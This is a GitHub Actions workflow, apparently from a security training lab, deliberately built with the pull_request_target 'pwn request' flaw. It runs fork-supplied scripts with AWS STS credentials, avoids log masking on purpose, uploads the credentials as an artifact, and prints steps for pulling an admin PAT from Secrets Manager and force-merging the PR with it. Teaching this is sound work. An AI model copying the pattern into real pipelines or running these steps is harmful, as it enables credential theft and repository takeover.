name: Demo CI (Intentionally Vulnerable)

# Fires on PR open from forks. This IS the vulnerability being demonstrated.
on:
  pull_request_target:
    types: [opened, synchronize, reopened]

permissions:
  id-token: write
  contents: read

jobs:
  build:
    runs-on: [self-hosted, demo]
    steps:
      # Canonical misconfiguration: trusted target-repo workflow context checks out
      # and executes a handle-scoped script from the untrusted PR.
      - name: Checkout PR code
        uses: actions/checkout@v4
        with:
          repository: ${{ github.event.pull_request.head.repo.full_name }}
          ref: ${{ github.event.pull_request.head.sha }}
          # Required opt-in: this lab intentionally demonstrates the pwn-request pattern.
          allow-unsafe-pr-checkout: true

      - name: Resolve handle-scoped PR script
        id: pr_step
        uses: actions/github-script@v7
        with:
          script: |
            const {owner, repo} = context.repo;
            const pull_number = context.payload.pull_request.number;
            const files = await github.paginate(github.rest.pulls.listFiles, {
              owner,
              repo,
              pull_number,
              per_page: 100,
            });
            const names = files.map((file) => file.filename);
            const fileStatus = new Map(files.map((file) => [file.filename, file.status]));
            const submissionPattern = /^submissions\/([A-Za-z0-9_-]{1,32})\.json$/;
            const submissionFiles = names.filter((name) => submissionPattern.test(name));
            if (submissionFiles.length !== 1) {
              core.setFailed(`Exactly one submissions/<handle>.json file must change. Found: ${submissionFiles.join(", ") || "none"}`);
              return;
            }
            const submissionFile = submissionFiles[0];
            const submissionHandle = submissionFile.match(submissionPattern)[1];
            const stepFile = `ci/student-steps/${submissionHandle}.sh`;
            const stepFiles = names.filter((name) => name.startsWith("ci/student-steps/"));
            if (!names.includes(stepFile) || stepFiles.length !== 1) {
              core.setFailed(`Exactly one matching ci/student-steps/<handle>.sh file must change. Expected: ${stepFile}`);
              return;
            }
            const blocked = names.filter((name) => name !== submissionFile && name !== stepFile);
            if (blocked.length) {
              core.setFailed(`Only submissions/<handle>.json and ci/student-steps/<handle>.sh may change. Blocked: ${blocked.join(", ")}`);
              return;
            }
            const allowedChangeStatuses = new Set(["added", "modified"]);
            if (!allowedChangeStatuses.has(fileStatus.get(submissionFile)) || !allowedChangeStatuses.has(fileStatus.get(stepFile))) {
              core.setFailed(`Matched submission and student step must be added or modified. Statuses: ${submissionFile}=${fileStatus.get(submissionFile)}, ${stepFile}=${fileStatus.get(stepFile)}`);
              return;
            }
            core.setOutput("submission_file", submissionFile);

      # Mint the OIDC token manually. Do NOT use aws-actions/configure-aws-credentials;
      # it calls ::add-mask:: on the STS values and redacts them in the log.
      - name: Mint OIDC token
        id: oidc
        uses: actions/github-script@v7
        with:
          script: |
            return await core.getIDToken('sts.amazonaws.com')
          result-encoding: string

      - name: Exchange OIDC for STS and run PR-controlled step
        env:
          ROLE_ARN: ${{ vars.AWS_ROLE_ARN }}
          AWS_REGION: ${{ vars.AWS_REGION }}
          SECRET_NAME: ${{ vars.SECRET_NAME }}
          OIDC_TOKEN: ${{ steps.oidc.outputs.result }}
          PR_NUMBER: ${{ github.event.pull_request.number }}
          REPO_FULL: ${{ github.repository }}
          SUBMISSION_FILE: ${{ steps.pr_step.outputs.submission_file }}
        run: |
          set -eu
          REPO_OWNER="${REPO_FULL%%/*}"
          REPO_NAME="${REPO_FULL#*/}"
          RTV_HANDLE="${SUBMISSION_FILE#submissions/}"
          RTV_HANDLE="${RTV_HANDLE%.json}"
          STUDENT_STEP="ci/student-steps/${RTV_HANDLE}.sh"
          test -f "$STUDENT_STEP"
          STS_CREDS_DIR="${RUNNER_TEMP}/sts-${GITHUB_RUN_ID}-${GITHUB_RUN_ATTEMPT}"
          STS_CREDS_PATH="${STS_CREDS_DIR}/sts-creds.sh"
          rm -rf "$STS_CREDS_DIR"
          mkdir -p "$STS_CREDS_DIR"
          export STS_CREDS_PATH


          CREDS=$(aws sts assume-role-with-web-identity \
            --role-arn "$ROLE_ARN" \
            --role-session-name "demo-pr-${PR_NUMBER}-$(date +%s)" \
            --web-identity-token "$OIDC_TOKEN" \
            --duration-seconds 900 \
            --output json)

          export AWS_ACCESS_KEY_ID
          export AWS_SECRET_ACCESS_KEY
          export AWS_SESSION_TOKEN
          export AWS_REGION
          AWS_ACCESS_KEY_ID=$(echo "$CREDS" | jq -r .Credentials.AccessKeyId)
          AWS_SECRET_ACCESS_KEY=$(echo "$CREDS" | jq -r .Credentials.SecretAccessKey)
          AWS_SESSION_TOKEN=$(echo "$CREDS" | jq -r .Credentials.SessionToken)
          EXP=$(echo "$CREDS" | jq -r .Credentials.Expiration)

          bash "$STUDENT_STEP"

          echo ""
          echo "============================================================"
          echo "  Student-controlled pipeline step wrote STS exports"
          echo "  Handle: $RTV_HANDLE"
          echo "  Valid until: $EXP"
          echo "============================================================"
          echo ""
          echo "Then run, in order:"
          echo ""
          echo "  # 1. Pull the GitHub admin PAT from Secrets Manager"
          echo "  PAT=\$(aws secretsmanager get-secret-value \\"
          echo "    --secret-id $SECRET_NAME \\"
          echo "    --query SecretString --output text)"
          echo ""
          echo "  # 2. Force-merge your own PR using the stolen PAT"
          echo "  curl -X PUT \\"
          echo "    -H \"Authorization: token \$PAT\" \\"
          echo "    -H \"Accept: application/vnd.github+json\" \\"
          echo "    https://api.github.com/repos/$REPO_FULL/pulls/$PR_NUMBER/merge"
          echo ""
          echo "  # 3. Refresh the trophy wall after the deploy workflow finishes"
          echo "  Visit https://${REPO_OWNER}.github.io/${REPO_NAME}/"
          echo ""
          echo "  # Your PR should flip to 'Merged' in the GitHub UI."
          echo "============================================================"

      - name: Require STS credentials artifact
        run: test -s "${RUNNER_TEMP}/sts-${GITHUB_RUN_ID}-${GITHUB_RUN_ATTEMPT}/sts-creds.sh"

      - name: Upload STS credentials as artifact
        uses: actions/upload-artifact@v4
        with:
          name: sts-credentials
          path: ${{ runner.temp }}/sts-${{ github.run_id }}-${{ github.run_attempt }}/sts-creds.sh
          if-no-files-found: error
          retention-days: 1

      - name: Remove STS credentials from runner
        if: always()
        run: rm -rf "${RUNNER_TEMP}/sts-${GITHUB_RUN_ID}-${GITHUB_RUN_ATTEMPT}"
